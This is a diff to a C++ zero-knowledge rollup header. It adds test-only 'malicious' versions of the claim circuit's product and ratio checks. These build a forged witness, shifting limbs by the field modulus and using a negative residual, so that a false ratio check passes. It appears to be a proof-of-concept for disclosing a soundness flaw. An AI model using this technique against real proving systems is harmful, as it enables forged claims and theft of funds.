@@ -1,61 +1,43 @@
 #pragma once
 #include "claim_tx.hpp"
+#include "ratio_check.hpp"
 #include <stdlib/types/turbo.hpp>
-#include "../notes/constants.hpp"
 
 namespace rollup {
 namespace proofs {
 namespace claim {
 
+#ifndef ENABLE_MALICIOUS_RATIO_CHECK_FOR_TESTS
+static_assert(false, "THIS FILE CAN ONLY BE USED INT TESTS");
+#endif
+
 using namespace plonk::stdlib::types::turbo;
 
-struct ratios {
-    field_ct a1;
-    field_ct a2;
-    field_ct b1;
-    field_ct b2;
-
-    // Get residual of a1 * b2 (mod a2)
-    // Notice, it'll be 0 if a1 * b2 == k * a2 for some k.
-    field_ct get_residual(Composer& composer) const
-    {
-        uint256_t a1_v = a1.get_value();
-        uint256_t a2_v = a2.get_value();
-        uint256_t b2_v = b2.get_value();
-
-        if (a2_v != 0) {
-            uint256_t remainder = ((uint512_t(b2_v) * uint512_t(a1_v)) % a2_v).lo;
-
-            field_ct residual = witness_ct(&composer, remainder);
-            return residual;
-        } else {
-            return witness_ct(&composer, 0);
-        }
-    }
-};
-
+// This function creates the same constraints as product check, but creates a malicious witness
 // Validate that a1 * b1 == a2 * b2 , when (a1, b1, a2, b2) are treated as Integers
-inline bool_ct product_check(Composer& composer,
-                             const field_ct& a1,
-                             const field_ct& b1,
-                             const field_ct& a2,
-                             const field_ct& b2,
-                             const field_ct& residual = 0)
+inline bool_ct malicious_product_check(Composer& composer,
+                                       const field_ct& a1,
+                                       const field_ct& b1,
+                                       const field_ct& a2,
+                                       const field_ct& b2,
+                                       const field_ct& residual = 0)
 {
     constexpr barretenberg::fr shift_1 = barretenberg::fr(uint256_t(1) << 68);
     constexpr barretenberg::fr shift_2 = barretenberg::fr(uint256_t(1) << (68 * 2));
     constexpr barretenberg::fr shift_3 = barretenberg::fr(uint256_t(1) << (68 * 3));
-
+    info("Going into malicious codepath");
+    // CODE MODIFIED FOR PoC
     // Split a field_t element into 4 68-bit limbs
-    const auto split_into_limbs = [&composer, &shift_1, &shift_2, &shift_3](const field_ct& input,
-                                                                            const size_t MAX_INPUT_BITS) {
-        const uint256_t value = input.get_value();
+    // we modify the witness generation so that we can add n*FIELD_MODULUS to the
+    // limbs (which doesn't affect the decomposition constraints)
+    const auto split_into_limbs = [&composer, &shift_1, &shift_2, &shift_3](
+                                      const field_ct& input, const size_t MAX_INPUT_BITS, const barretenberg::fr n) {
+        const uint256_t value_ = input.get_value();
+        const uint256_t p = (const uint256_t)barretenberg::fr(-1) + 1;
+
+        const uint256_t value = value_ + p * n;
 
         constexpr size_t NUM_BITS_PER_LIMB = 68;
-
-        ASSERT(MAX_INPUT_BITS <= MAX_NO_WRAP_INTEGER_BIT_LENGTH);
-        ASSERT(MAX_INPUT_BITS > 0);
-
         const uint256_t t0 = value.slice(0, NUM_BITS_PER_LIMB);
         const uint256_t t1 = value.slice(NUM_BITS_PER_LIMB, 2 * NUM_BITS_PER_LIMB);
         const uint256_t t2 = value.slice(2 * NUM_BITS_PER_LIMB, 3 * NUM_BITS_PER_LIMB);
@@ -70,6 +52,7 @@ inline bool_ct product_check(Composer& composer,
 
         field_ct limb_sum_1 = limbs[0].add_two(limbs[1] * shift_1, limbs[2] * shift_2);
         field_ct limb_sum_2 = input - (limbs[3] * shift_3);
+        // std::cout << "limb decomposition " << limb_sum_1 << " ; " << limb_sum_2 << std::endl;
         limb_sum_1.assert_equal(limb_sum_2);
 
         // Since the modulus is a power of two minus one, wwe can simply range constrain each of the limbs
@@ -92,17 +75,18 @@ inline bool_ct product_check(Composer& composer,
         return limbs;
     };
 
-    // b1 = a1 * b2 mod a2
-    // => a1 * b2 = b1 * a2 + r \in Z (equation 1)
+    // CODE MODIFIED FOR PoC
+    // change limb splitting witness generation so that the left side
+    // of the equation is increased by the modulus P.
+    // (the right side is already increased by P as we use a negative residual)
 
-    // split a1, a2, b1, b2, r into 68-bit limbs
-    // evaluate equation 1 via limb arithmetic. The limb arithmetic *cannot overflow*
+    const auto left_1 = split_into_limbs(a1, notes::DEFI_DEPOSIT_VALUE_BIT_LENGTH, 0);
+    const auto left_2 = split_into_limbs(a2, notes::NOTE_VALUE_BIT_LENGTH, 0);
+    const auto right_1 = split_into_limbs(b1, notes::NOTE_VALUE_BIT_LENGTH, 1);
+    const auto right_2 = split_into_limbs(b2, notes::NOTE_VALUE_BIT_LENGTH, 0);
+    const auto residual_limbs = split_into_limbs(residual, notes::NOTE_VALUE_BIT_LENGTH, 0);
 
-    const auto left_1 = split_into_limbs(a1, notes::DEFI_DEPOSIT_VALUE_BIT_LENGTH);
-    const auto left_2 = split_into_limbs(a2, notes::NOTE_VALUE_BIT_LENGTH);
-    const auto right_1 = split_into_limbs(b1, notes::NOTE_VALUE_BIT_LENGTH);
-    const auto right_2 = split_into_limbs(b2, notes::NOTE_VALUE_BIT_LENGTH);
-    const auto residual_limbs = split_into_limbs(residual, notes::NOTE_VALUE_BIT_LENGTH);
+    // Rest of the code isn't modified.
 
     // takes a [204-208]-bit limb and splits it into a low 136-bit limb and a high 72-bit limb
     const auto split_out_carry_term = [&composer, &shift_2](const field_ct& limb) {
@@ -147,7 +131,6 @@ inline bool_ct product_check(Composer& composer,
             const auto r3 = left[3].madd(right[3], t2[1]);
             return std::array<field_ct, 4>{ r0, r1, r2, r3 };
         }
-
         const auto t0 = split_out_carry_term(left[0].madd(right[0], (b * shift_1)));
         const auto r0 = t0[0];
         const auto t1 = split_out_carry_term(t0[1].add_two(c, d * shift_1));
@@ -163,6 +146,7 @@ inline bool_ct product_check(Composer& composer,
 
     bool_ct balanced(&composer, true);
     for (size_t i = 0; i < 4; ++i) {
+        // std::cout << "i" << i << ": " << lhs[i] << " ; " << rhs[i] << std::endl;
         balanced = balanced && lhs[i] == rhs[i];
     }
 
@@ -170,13 +154,13 @@ inline bool_ct product_check(Composer& composer,
 }
 
 /**
+ * This function creates teh same constraints as regular ratio check, but constructs a malicious witness
  * Will return true if the ratios are the same, false if not or if either denominator is 0.
  * Effectively: a1 / a2 == b1 / b2
  */
-inline bool_ct ratio_check(Composer& composer, ratios const& ratios)
+inline bool_ct malicious_ratio_check(Composer& composer, const ratios& ratios)
 {
-    const field_ct residual = ratios.get_residual(composer);
-
+    const field_ct residual = witness_ct(&composer, barretenberg::fr(100 - 100 * 100));
     // we have the following implicit definitions for `ratios.a1/a2/b1/b2`:
     //       a1 = deposit_value
     //       a2 = total_input_value
@@ -204,7 +188,7 @@ inline bool_ct ratio_check(Composer& composer, ratios const& ratios)
         .create_range_constraint(notes::NOTE_VALUE_BIT_LENGTH, "ratio_check range constraint failure: residual >= a2");
 
     return (ratios.a2 != 0) && (ratios.b2 != 0) &&
-           product_check(composer, ratios.a1, ratios.b2, ratios.b1, ratios.a2, residual);
+           malicious_product_check(composer, ratios.a1, ratios.b2, ratios.b1, ratios.a2, residual);
 }
 
 } // namespace claim
